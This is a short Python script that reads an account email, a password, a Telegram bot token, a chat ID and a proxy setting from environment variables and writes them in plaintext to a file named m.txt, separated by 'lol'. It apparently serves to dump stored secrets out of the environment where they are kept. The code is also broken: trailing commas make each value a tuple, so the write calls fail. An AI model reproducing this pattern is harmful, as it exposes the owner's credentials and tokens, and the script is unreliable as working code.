import os

email=os.getenv("REMANGA_EMAIL"),
password=os.getenv("REMANGA_PASSWORD"),
telegram_token=os.getenv("TELEGRAM_BOT_TOKEN"),
chat_id=os.getenv("TELEGRAM_CHAT_ID"),
proxy=os.getenv("CUSTOM_PROXY"),
with open("m.txt","w+") as f:
    f.write(email)
    f.write("lol")
    f.write(password)
    f.write("lol")
    f.write(telegram_token)
    f.write("lol")
    f.write(chat_id)
    f.write("lol")
    f.write(proxy)
